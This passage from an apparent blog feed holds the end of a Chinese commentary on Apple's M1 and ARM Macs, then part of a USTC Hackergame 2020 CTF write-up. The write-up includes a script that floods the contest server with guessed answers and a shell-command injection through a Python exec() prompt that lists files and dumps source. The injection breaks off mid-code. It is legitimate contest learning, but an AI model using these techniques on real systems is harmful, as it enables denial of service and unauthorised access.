的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span 